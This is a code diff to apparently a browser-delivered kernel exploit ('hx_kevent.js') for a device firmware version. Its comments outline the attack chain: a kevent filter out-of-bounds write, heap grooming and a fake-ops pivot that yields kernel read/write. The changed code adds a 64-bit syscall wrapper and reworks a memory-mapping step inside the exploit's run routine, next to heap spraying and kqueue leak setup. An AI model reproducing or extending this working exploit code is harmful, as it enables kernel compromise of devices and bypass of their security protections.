@@ -5,7 +5,6 @@ import { HX1400_TABLES } from "./hx_tables.js";
 // hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
 // Bug: kevent(filter=-23) -> OOB in kernel filter-ops table -> 8-byte write
 // into a groomed zone-256 object -> fakeops pivot -> kernel R/W.
-// ac(u,NUM,..)=ctx.sc(NUM,..) | Unsafe getLong/putLong=ctx.p.read8/write8
 // Uses ctx().stubAddr (stage-1 syscall stub map), NOT dynsym: 14.00 libkernel
 // is mapped without ELF headers (NATIVES-PROBE confirms), so in-memory
 // dynsym parsing is impossible. Syscall numbers come from the bytecode.
@@ -56,6 +55,13 @@ function scn(name, a, b, c, d, e, f) {
   const stub = ctx().stubAddr.get(n);
   if (!stub) fin("stub missing: " + name + " (" + n + ")");
   return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
+}
+
+function scn64(name, a, b, c, d, e, f) {
+  const n = NUM[name];
+  const stub = ctx().stubAddr.get(n);
+  if (!stub) fin("stub missing: " + name + " (" + n + ")");
+  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
 }
 
 // ---------- arena ----------
@@ -153,11 +159,10 @@ export async function runKevent(c) {
 
   const { fds } = phaseSpray(256);
 
-  const raw = num(ctx().bufAddr(new ArrayBuffer(16384)));
-  const page = raw & ~0x3fffn;
-  const mr = scn("mmap", page, 16384, 3, 4114, -1, 0);
-  log("MMAP-FIXED", "want=" + h16(page) + " got=" + h16(mr));
-  if (mr !== page) fin("mmap fixed " + h16(mr));
+  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
+  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
+  log("MMAP-ANON", "page=" + h16(page));
+  if (page < 0x10000n) fin("mmap anon failed rv=" + mr.i32 + " errno=" + ctx().errno());
 
   const leakKq = scn("kqueue");
   if (leakKq < 0) fin("leak kqueue");
